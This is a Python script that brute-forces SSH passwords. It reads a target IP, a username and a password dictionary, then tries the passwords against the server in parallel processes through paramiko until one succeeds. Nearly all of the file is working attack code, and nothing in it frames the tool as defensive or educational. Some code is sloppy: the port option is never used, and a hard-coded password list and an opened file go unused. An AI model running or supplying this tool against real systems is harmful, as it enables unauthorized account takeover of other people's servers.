import multiprocessing as mp
from multiprocessing import Value, Lock
import paramiko
import time
import optparse
from net_tools import get_ping

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", \
            help="IP of the server you want to brute force")
    parser.add_option("-u", "--user", dest="user", \
            help="user name on the server")
    parser.add_option("-j", "--processes", dest="num_processes", \
            help="number of processes to launch in parallel", default= mp.cpu_count())
    parser.add_option("-p", "--protocol", dest="protocol", \
            help="Protocol you want to use (SSH, FTP...)", default='ssh')
    parser.add_option("-P", "--port", dest="port", \
            help="Port on which you want to run the attack", default=24)
    parser.add_option("-f", "--file", dest="password_file", \
            help="Dictionnary where the list of password is stored")

    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify an IP address --help for more info")
    elif not options.user:
        parser.error("[-] Please specify a username, use --help for more info")
    elif not options.password_file:
        parser.error("[-] Please specify a dictionnary file, use --help for more info")
    return options 

def print_attack(user, host, protocol, port):
    print("===================================================")
    print("Launching a brute force attack on")
    print("User: " + str(user))
    print("Host: " + str(host))
    print("port: " + str(port))
    print("protocol: " +str(protocol))
    print("===================================================")

def ssh_attack(user, address, password, queue, index, found_password):
    index.value+=1
    print('Testing password: ' + password + "\t\t #" + str(index.value))
    try :
        ssh.connect(address, username=user, password=password)
        queue.put(password)
        found_password.value=password
        return True

    except paramiko.ssh_exception.AuthenticationException as e :
        return False

    except paramiko.ssh_exception.NoValidConnectionsError as e :
        return False


def file2list(file_to_convert):
    with open(file_to_convert,'r') as file_list:
        #get the password file into a list, removing \n characteres
       password_list = [i.strip() for i in file_list.readlines()]
       return password_list 

if __name__ == '__main__':

    #retrieving options
    options = get_arguments()
    
    user = options.user
    target = options.target
    port = options.port
    protocol = options.protocol
    password_file = options.password_file
    num_processes=int(options.num_processes)

    #printer start-up baneer
    print_attack(user, target, protocol, port)

    print("[+]Preparing brute force on server at IP "+ options.target)

    #Checking if the server can be pinged
    get_ping(str(options.target))

    #retrieving a dictionnary of password
    pass_list = ['test1','test2','test3', 'toor']

    #creating the ssh connection object
    ssh = paramiko.SSHClient()

    #this is to add new host automatically
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    #openning password dictionnary
    f = open('pass.txt','r')

    manager = mp.Manager()
    queue = manager.Queue() #This is needed to retrieve the final password
    t1 = time.time()

    #Create a value that can be shared between processes
    index=manager.Value('i',0) 

    #Create a value to store the final password if found
    found_password=manager.Value('s','') 

    #getting the password file into list
    password_list = file2list(password_file)
    process_list =[]

    #loop over the passwords in the list
    while password_list:
        #retrieve the num_processes first passwords
        temp_password_list = password_list[:num_processes]

        #storing all the multiprocess obj in a list
        for i in range(0,num_processes):
            process_list.append(mp.Process(target=ssh_attack, \
                    args=(options.user, options.target, temp_password_list[i],\
                    queue, index, found_password)) )

            #starting the last process added
            process_list[-1].start()

        #joining the processes
        for i in range(0,num_processes):
            process_list[i].join()

        #reset the list to feed to the process and update the password list
        del password_list[:num_processes]
        process_list =[]

        #if the password has been found
        if queue.qsize()>=1:
            print("Oh yeah baby, we found it! The password is " + str(found_password.value))
            break 

        if len(password_list)==0:
            print("Sorry, the password could not be found!")

    print("We are done here!")    
